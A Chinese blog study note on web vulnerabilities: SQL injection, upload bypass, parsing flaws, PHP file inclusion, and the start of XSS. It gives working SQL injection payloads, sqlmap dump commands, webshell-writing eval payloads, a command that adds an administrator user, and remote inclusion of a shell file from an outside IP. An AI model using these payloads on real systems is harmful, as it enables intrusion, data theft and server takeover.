<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>常见漏洞原理简介 - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="常见漏洞原理简介" />
<meta property="og:description" content="今天复习上个月学的漏洞的知识点。
一、SQL注入漏洞 sql注入是就是通过把SQL语句插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。
理解这张图就可以理解sql注入的原理，因为在mysql数据库中存在一个Information_schema数据库，这个数据库里面存在两张表。一个是tables表，里面存有所有的表名和数据库名；另一个是columns表，里面存有所有的字段名，字段所属的表名，字段所属的库名。第一步我们查找数据库名，第二步我们通过查找tables表里的数据库，可以确定表名，第三步我们通过前两步得到的库名和表名就可以在columns这张表中得到字段名，最后一步我们通过前几步得到的数据库名、表名、字段名得到想要的数据。
如何通过进行sql注入，进后台？
1、找注入点，判断是否可以注入。
2、判断是数字型注入还是字符型注入。and 1=1 ；and 1=2
3、如果是字符型注入，判断闭合符。’ &#34; &#39;) &#34;) …
4、优先使用联合查询注入-&gt;报错查询 -&gt;bool型查询 -&gt;时间盲注 -&gt;宽字节
5、判断列数。 order by
6、判断显错位。 union select 1,2,3, …
7、求库、求表、求字段、求数据。
8、找后台，御剑扫后台目录。
9、上传一句话木马。菜刀，蚁剑连接
1、数字型注入 id=1&#39; //报错，说明有注入点 id=1 and 1=1 //正确 id=1 and 1=2 //错误，说明是数字型注入，否者为字符型注入 order by //判断列数 and 1=2 union select 1,2,3, ... //判断显错位 and 1=2 union select 1,2,database() //求库 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39; //求表 and 1=2 union select 1,2,group_concat(column_name) from information_schema." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/1514e75b3d94cdd45b2f39d192ef3743/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-09-15T23:06:45+08:00" />
<meta property="article:modified_time" content="2020-09-15T23:06:45+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">常见漏洞原理简介</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>       今天复习上个月学的漏洞的知识点。<br></p> 
<h3><a id="SQL_2"></a><strong>一、SQL注入漏洞</strong></h3> 
<p>       sql注入是就是通过把SQL语句插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。<br><br>        理解这张图就可以理解sql注入的原理，因为在mysql数据库中存在一个Information_schema数据库，这个数据库里面存在两张表。一个是tables表，里面存有所有的表名和数据库名；另一个是columns表，里面存有所有的字段名，字段所属的表名，字段所属的库名。第一步我们查找数据库名，第二步我们通过查找tables表里的数据库，可以确定表名，第三步我们通过前两步得到的库名和表名就可以在columns这张表中得到字段名，最后一步我们通过前几步得到的数据库名、表名、字段名得到想要的数据。<br><br> <img src="https://images2.imgbox.com/78/d4/RKMBp0Bl_o.png" alt="在这里插入图片描述"></p> 
<br> 
<p>       如何通过进行sql注入，进后台？<br><br>               1、找注入点，判断是否可以注入。<br><br>               2、判断是数字型注入还是字符型注入。and 1=1 ；and 1=2<br><br>               3、如果是字符型注入，判断闭合符。’ " ') ") …<br><br>               4、优先使用联合查询注入-&gt;报错查询 -&gt;bool型查询 -&gt;时间盲注 -&gt;宽字节<br><br>               5、判断列数。 order by<br><br>               6、判断显错位。 union select 1,2,3, …<br><br>               7、求库、求表、求字段、求数据。<br><br>               8、找后台，御剑扫后台目录。<br><br>               9、上传一句话木马。菜刀，蚁剑连接<br> <br></p> 
<pre><code class="prism language-sql"><span class="token number">1</span>、数字型注入

	id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'   //报错，说明有注入点
	id=1 and 1=1  //正确
	id=1 and 1=2  //错误，说明是数字型注入，否者为字符型注入

	order by  //判断列数
	and 1=2 union select 1,2,3, ...   //判断显错位
	and 1=2 union select 1,2,database()   //求库
	and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>数据库名<span class="token string">'   //求表
	and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='</span>数据库名<span class="token string">' and table_name='</span>表名'   <span class="token comment">//求字段</span>
	<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>字段名<span class="token punctuation">,</span>字段名<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token keyword">from</span> 数据库<span class="token punctuation">.</span>表名   <span class="token comment">//求数据</span>
</code></pre> 
<br> 
<pre><code class="prism language-sql"><span class="token number">2</span>、字符型注入（每句话的后面需要加<span class="token comment">--+）</span>
	id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'   //报错，说明有注入点
	id=1’ and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>  <span class="token comment">//正确</span>
	id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'  and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">2</span>  <span class="token comment">//错误，说明是字符型注入</span>

	<span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token comment">//判断列数</span>
	<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   <span class="token comment">//判断显错位</span>
	<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//求库</span>
	<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'数据库名'</span>   <span class="token comment">//求表</span>
	<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'数据库名'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'表名'</span>   <span class="token comment">//求字段</span>
	<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>字段名<span class="token punctuation">,</span>字段名<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token keyword">from</span> 数据库<span class="token punctuation">.</span>表名   <span class="token comment">//求数据</span>
</code></pre> 
<br> 
<pre><code class="prism language-sql"><span class="token number">3</span>、<span class="token keyword">bool</span>盲注入
	首先是判断是数字型还是字符型注入，在得到页面只返回<span class="token boolean">True</span>和<span class="token boolean">False</span>两种类型页面。利用页面返回不同，逐个猜解数据，那么我们可以判断这是一个布尔型盲注。
	
	<span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span>  <span class="token comment">//求库名长度，</span>
	<span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">98</span>  <span class="token comment">//求库名，求八次</span>
	<span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'数据库名'</span> <span class="token keyword">limit</span> <span class="token number">0</span>，<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">100</span> <span class="token comment">//求表名，</span>
	<span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> <span class="token keyword">table</span><span class="token punctuation">.</span><span class="token keyword">schema</span><span class="token operator">=</span><span class="token string">'数据库名'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'表名'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">118</span>  <span class="token comment">//求字段名</span>
	<span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> 字段名 <span class="token keyword">from</span> 数据库名<span class="token punctuation">.</span>表名 <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">118</span>  <span class="token comment">//求数据</span>

</code></pre> 
<pre><code class="prism language-sql"><span class="token number">4</span>、时间盲注入
	首先是判断是数字型还是字符型注入，在得到页面响应时间多少来判断是否是时间盲注。利用页面响应时间不同，逐个猜解数据，那么我们可以判断这是一个时间盲注。
	<span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">//如果数据库名长度在8，这响应延时5秒</span>
	<span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">95</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">//如果数据库</span>


<span class="token number">5</span>、报错查询
	<span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//求库名</span>
	<span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span>数据库<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//求表名</span>
	<span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'数据库名'</span><span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'表名'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//求字段名</span>
	<span class="token operator">and</span> updataxml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>字段，<span class="token number">0x23</span><span class="token punctuation">,</span>字段<span class="token punctuation">)</span> <span class="token keyword">from</span> 数据库名<span class="token punctuation">.</span>表名<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//求数据</span>


<span class="token number">6</span>、宽字节注入

<span class="token keyword">index</span><span class="token punctuation">.</span>php?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token keyword">index</span><span class="token punctuation">.</span>php?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">%</span><span class="token number">23</span>
这后面的和前面的几种类型注入相识，就不写了。
</code></pre> 
<pre><code class="prism language-bash">在这里写一下sqlmap的用法。

sqlmap
sqlmap -u <span class="token string">"url"</span>  //-u选项是检测注入点
sqlmap -u <span class="token string">"url"</span> --dbs  //--dbs选项是列出所有数据库名
sqlmap -u <span class="token string">"url"</span> --current-db  //--current-db选项是列出当前数据库的名字
sqlmap -u <span class="token string">"url"</span> -D <span class="token string">"数据库名"</span> --tables //-D是指定一个数据库  --tables是列出这个数据库的所有表名
sqlmap -u <span class="token string">"url"</span> -D <span class="token string">"数据库名"</span> -T <span class="token string">"表名"</span> --columns //-T是指定表名  --columns是列出所有的字段名
sqlmap -u <span class="token string">"url"</span> -D <span class="token string">"数据库名"</span> -T <span class="token string">"表名"</span> -C <span class="token string">"字段名"</span> --dumo //-C是指定字段  --dumo是列出字段内容
</code></pre> 
<pre><code class="prism language-sql">对于一些绕过<span class="token keyword">sql</span>注入的方法
空格过滤绕过
大小写过滤绕过
双写关键字绕过
双重url编码绕过
十六进制绕过
等价函数替换绕过
</code></pre> 
<h3><a id="_109"></a><strong>二、文件上传漏洞</strong></h3> 
<br>         导致该漏洞的原因在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。 
<br> 
<br> 
<p>1、前端JS过滤绕过<br><br>        如果想要在一个开启了JavaScript验证的网站上传一句话木马，我们可以给浏览器设置代理，127.0.0.1，端口为8080.利用BurpSuite软件代理-&gt;打开intercept(拦截)-&gt;将木马的后缀名改为jpg格式-&gt;点击forward将数据包发回，这样就可以上传成功。最后用菜刀连接。<br> 还有一种方法就是在地址栏输入：about:config，搜索javascript:enabled,双击关闭，也可以成功。<br><br></p> 
<p>2、Content-Type绕过<br><br>        Content-Type一般是指网页中存在的Content-Type，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件。<br> 如果想要在一个有type验证的网站上传一句话木马，我们可以给浏览器设置代理，127.0.0.1，端口为8080.利用BurpSuite软件代理-&gt;打开intercept(拦截)-&gt;修改包内的Content-Type值：将application/octet-stream修改为image/jpeg。-&gt;点击forward将数据包发回，这样就可以上传成功。<br></p> 
<p>3、扩展名绕过<br><br>        如果想要绕过有扩展名验证的网站上传一句话木马，这个很简单，可以把后缀换成大小写的方式绕过。<br></p> 
<p>4、00截断绕过<br><br>        想通过00%截断来绕过有验证的网站上传一句话木马。将上传的文件名命名为test.php%00.jpg格式，我们可以给浏览器设置代理，127.0.0.1，端口为8080.利用BurpSuite软件代理-&gt;打开intercept(拦截)-&gt;修改包内的Content-Type值：将%00右击选择Covert selection选项中的URL进行编码-&gt;点击forward将数据包发回，这样就可以上传成功。注：系统在对文件名的读取时，如果遇到%00，就会认为读取已结束，不在读取后面的内容。<br><br> 5、修改文件头绕过<br><br>        想要绕过有文件头校验的网站上传一句话木马，这个也很简单，就是在网上下载一张图片，用记事本打开，在图片的中间位置写上一句话木马。保存图片，就可以上传了。<br></p> 
<p>6、.htaccess文件上传<br><br>        这个文件里面的内容是AddType application/x-httpd-php .jpg。我们可以先上传.htaccess这个文件，然后在通过在图片中写入一句话木马，上传图片，这样图片就会被解析成php语言。<br> <br></p> 
<h3><a id="_135"></a><strong>三、解析漏洞</strong></h3> 
<br>        文件在某种格式下，会被执行为该脚本语言的文件。 文件上传漏洞通常与Web容器的解析漏洞配合利用。 
<br> 
<br> 
<p>1、<strong>PHP CGI解析漏洞</strong><br><br>        Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，并将phpinfo.jpg作为PHP文件解析。如果开启了fix_pathinfo这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。<br>        用法：在一个有文件上传漏洞的Nginx与php搭建的服务器上上传一个一句话木马的图片，当我们在上传的图片的路径下一级添加上1.php，那么图片木马就可以被解析成php语言。<br><br></p> 
<p>2、<strong>apache解析漏洞</strong><br><br>        只要是.php.<em>结尾，且“.</em>”无法被Apache解析，就会被Apache服务器解析成php文件，问题是apache如果在mime.types文件里面没有定义的扩展名在诸如x1.x2.x3的情况下，最后一个x3的没有定义，他会给解析成倒数第二个的x2的定义的扩展名。所以xxx.php.rar或者 xxx.php.111这些默认没在mime.types文件定义的都会解析成php的。<br> 用法：在一个有文件上传漏洞的有apache与php搭建的服务器上上传一个一句话木马的文件，这个文件后缀名为.php.111，我们在访问这个文件时就会被解析成php执行。<br><br></p> 
<p>3、<strong>IIS文件名解析漏洞</strong><br><br>        IIS6.0解析漏洞有两种： 第一种是修改后缀，建立一个“<em>.asp;.gif”的文件，windows会将他作为一个图片解析，但IIS不会。 第二种是在目录下建立一个“</em>.asp”的文件夹，然后此文件夹里的所有文件都会被解析为ASP文件然后执行。<br><br>        用法：<br>        第一种：新建文件后缀名为.asp;后面随意加上后缀名为.gif,这个文件就会被Windows会当成jpg图像文件，但是这种文件在IIS中会被当成asp运行。<br>        第二种：在目录下建立一个后缀名为.asp文件夹，这样里面的所有文件都会被解析为asp文件。<br><br></p> 
<h3><a id="_154"></a><strong>四、文件包含漏洞</strong></h3> 
<p>       在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。<br></p> 
<p>       简单来说就是在写程序时遇到了重复编写的代码，程序员就会把这些重复的代码写在一个文件中，到时候要用到重复的代码时直接调用这个文件。<br><br> 1、<strong>PHP四个常见文件包含函数</strong></p> 
<p>       include()执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行。<br>        require()只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本。<br>        include_once()与require_once()若文件中代码已被包含则不会再次包含<br><br>        注：要保证php.ini中allow_url_fopen和allow_url_include要为On。<br>        注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。<br>        注：php.ini配置文件：allow_url_fopen=off 时不可以包含远程文件，只有开启了才可以包含。Php4存在远程&amp;本地，php5仅存在本地包含。<br></p> 
<p>2、 <strong>伪协议使用</strong></p> 
<p>（1）php://filter 可以利用它进行任意文件读取，只需要开启 allow_url_fopen 。<br>        用法：/06.php?filename=php://filter/convert.base64-encode/resource=06.php。得到的结果要用base64解码。<br> 注： filename是GET请求的参数<br><br></p> 
<p>（2）php://input 可以直接读取到POST上没有经过解析的原始数据，将post请求中的数据作为PHP代码执行。<br>        注：不过在enctype="multipart/form-data"的时候php://input 是无效的。<br>        只需要把php配置文件（php.ini）中的allow_url_include打开，设置为On，就可以了。<br>        php://input只是能够获取POST参数中的数据，真正能够创建文件和把数据写入文件的函数是：fopen()函数和fputs()函数<br>        fopen()函数是用来打开文件或者是URL，如果打开失败的话，本函数返回FALSE，格式：fopen(filename,mode,可选1,可选2)<br>        fputs()函数的作用是写入文件（可安全的用于二进制文件），它是fwrite()函数的别名。<br>        格式：fputs(file,string,可选)： fwrite() 把 string 的内容写入文件指针 file 处。 如果指定了 length，当写入了 length 个字节或者写完了 string 以后，写入就会停止。fwrite() 返回写入的字符数，出现错误时则返回 false。</p> 
<p>       用法：/07.php?filename=php://input 数据利用POST传过去<br>        POST传下面的话<br>        &lt;?php fputs(fopen("/var/www/html/fi/shell.php","w"),"&lt;?php @eval($_POST[1]);?&gt;")?&gt;<br>        然后访问：/07.php?filename=php://input/var/www/html/fi/shell.php<br>        如果报错就用“\”把POST方法转义一下：$_POST[1]<br>        注：file_get_contents()函数，这个函数的作用是把整个文件读入一个字符串中。<br> <br></p> 
<p>（3）data://伪协议 是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；<br>        用法：/10.php?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br>        &lt;?php phpinfo();?&gt;用base64编码变成PD9waHAgcGhwaW5mbygpOz8%2b这样就可以成功执行一句话木马。<br>        如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） <br><br></p> 
<p>(4)file://伪协议利用 访问本地文件系统,不受allow_url_fopen与allow_url_include的影响<br>        可以查看系统用户信息<br>        /09.php?filename=file:///etc/passwd<br> <br><br> (5)phar://伪协议 这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。<br>        用法：/10.php?file=phar://压缩包/内部文件 phar://xxx.png（压缩包）/shell.php （内部文件）<br>        注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br>         步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。<br> <br><br> (6)zip://伪协议 zip伪协议和phar协议类似，但是用法不一样。<br>        用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php<br>        注：PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符<br> <br><br> 3、<strong>文件包含利用</strong></p> 
<pre><code class="prism language-sql"><span class="token number">1</span>、<span class="token operator">%</span><span class="token number">00</span>截断来包含文件
PHP版本必须小于<span class="token number">5.3</span><span class="token punctuation">.</span>x版本，把PHP扩展的参数开关magic_quotes_gpc给关掉
用法：http:<span class="token comment">//www.sad.com/shell/phpinfo.php%00</span>

<span class="token number">2</span>、点号截断
windows下目录最大长度为<span class="token number">256</span>字节，超出的部分会被丢弃；linux下目录最大长度为<span class="token number">4096</span>字节，超出的部分会被丢弃。所以用…绕过的时候windows 系统中，点号需要长于<span class="token number">256</span>；linux 系统中点号要长于<span class="token number">4096</span>

<span class="token number">3</span>、代码执行漏洞
（<span class="token number">1</span>）可以在本地建立shell<span class="token punctuation">.</span>php文件，里面写入<span class="token operator">&lt;</span>?php Eval<span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">'asd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span>  <span class="token comment">//$_REQUEST包含了$_GET、$_POST、$_COOKIE的所有内容，是它们的集合体。</span>
访问http:<span class="token comment">//www.asd.com/shell.php?asd=phpinfo();</span>
这就可以成功。
注：Eval<span class="token punctuation">(</span><span class="token punctuation">)</span>函数就可以把字符串按照PHP代码来执行，换句话说，就是可以动态地执行PHP代码，使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且必须以分号结尾。
（<span class="token number">2</span>）如果网站主页存在文件包含漏洞，我们利用它执行系统命令，比如添加用户。 
访问http:<span class="token comment">//www.asd.com/index.php?filename=php://input</span>
post传递数据<span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">'net user admin admin /add'</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span>
这样就能创建用户，之后还可以对其提权 比如： net localgroup Administrators admin <span class="token operator">/</span><span class="token keyword">add</span>。

<span class="token number">4</span>、远程文件包含
如果我们发现一个网站上存在文件包含漏洞，那么我们可以预先在自己的服务器上建立一句话木马，然后把自己的服务器上的路径作为参数传到有文件包含漏洞的网站上。<span class="token operator">&lt;</span>?php <span class="token variable">@eval</span><span class="token punctuation">(</span>\$_POST<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'123'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">&gt;</span>
用法：
访问http:<span class="token comment">//www.asd.com/index.php?filename=http://100.100.100.11/shell.txt</span>
菜刀连接
</code></pre> 
<br> 
<h3><a id="XSS_236"></a><strong>五、XSS跨站脚本攻击</strong></h3> 
<p>       XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。是由于Web应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意脚本代码（通常包括HTML代码和客户端JavaScript脚本）注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对端受害者可能采取cookie资料窃取、会话解除、钓鱼欺骗等各种攻击。<br> <br><br></p> 
<p><strong>1.DOM型XSS：</strong><br></p> 
<p>       DOM本身是一个表达XML文档的标准<br>        客户端的脚本程序可以通过DOM动态地检査和修改页面内容，它不依赖于服务器端的数据，而从客户端获得DOM中的数据（如从URL中提取数据）并在本地执行。另一方面，测览器用户可以操纵DOM中的一些对象，例如URL、 location等。用户在客户端输入的数据如果包含了恶意 JavaScript脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于DOM的XSS攻击。</p> 
